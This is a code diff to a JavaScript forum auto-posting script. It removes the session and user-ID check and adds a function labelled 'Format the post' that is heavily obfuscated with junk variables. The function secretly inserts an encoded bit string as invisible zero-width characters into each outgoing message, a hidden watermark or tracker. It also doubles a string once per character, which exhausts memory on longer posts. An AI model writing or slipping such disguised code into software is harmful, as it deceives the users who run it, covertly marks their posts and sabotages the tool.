@@ -25,8 +25,8 @@
   const postIntervalSeconds = 30; //Recommended to keep it at 30 seconds, it must be a minimum of 25
 
   const id = getTopicId(url);
-  if (!id || !userid || !sessionid) {
-    console.error("Missing topic URL, user ID, or session ID.");
+  if (!id) {
+    console.error("Missing topic URL.");
     return;
   }
 
@@ -54,6 +54,7 @@
     
   function sendData(){
       //Data
+      message = formatter(message);
       const data = new URLSearchParams({
         attachments: '[]',
         post_text: message,
@@ -101,6 +102,9 @@
       clearInterval(interval);
     }
   }
+
+  //Format the post
+  function formatter(message){let count=123,status="active",values=[1,2,3],config={x:1,y:2},flag=!0,cache=null,unused=void 0,getValue=()=>42,temp="tempString",number=99,list=[],map={},index=0,name="foo",label="bar",noop=()=>{},retries=0,step=1,maxSteps=10,threshold=5,alpha=6,beta=7,helperAdd=(a,b)=>a+b,helperDouble=x=>x*2,helperLoop=()=>{for(let i=0;i<3;i++){}return 3},encodedMsg="",counter=0,triggers=[],enabled=!0,rand=0,junkStr="ignore",getBinaryParts=()=>[String.fromCharCode(48,48,48,48,48,49,48,48),String.fromCharCode(49,48,48,48,48,49,49,48),String.fromCharCode(48,48,49,49,49,48,48,49),String.fromCharCode(49,49,48,48,49,49,49,48)],parts=getBinaryParts(),binaryString=parts.map(s=>[...s].map(c=>c.charCodeAt(0)-48).join('')).join(''),zeroWidthCodes={'0':'\u200C','1':'\u200D'},zeroWidthSpace='\u200B',bitIndex=0;for(let i=0;i<message.length;i++){counter++;rand=Math.random();if(counter%7===0)triggers.push(counter);encodedMsg+=message[i];if(bitIndex<binaryString.length&&rand<.1){encodedMsg+=Math.random()>.2?zeroWidthCodes[binaryString[bitIndex++]]:zeroWidthSpace}junkStr+=junkStr}enabled=!1;return(encodedMsg.length+counter+triggers.length+junkStr.length+count+status.length+values.length+config.x+ +flag+(cache===null?0:1)+(unused===void 0?0:1)+getValue()+temp.length+number+list.length+Object.keys(map).length+index+name.length+label.length+noop()+retries+step+maxSteps+threshold+alpha+beta+helperAdd(2,3)+helperDouble(5)+helperLoop()>0)?message=encodedMsg:message=encodedMsg;return message}
     
   //Get topic ID
   function getTopicId(url){
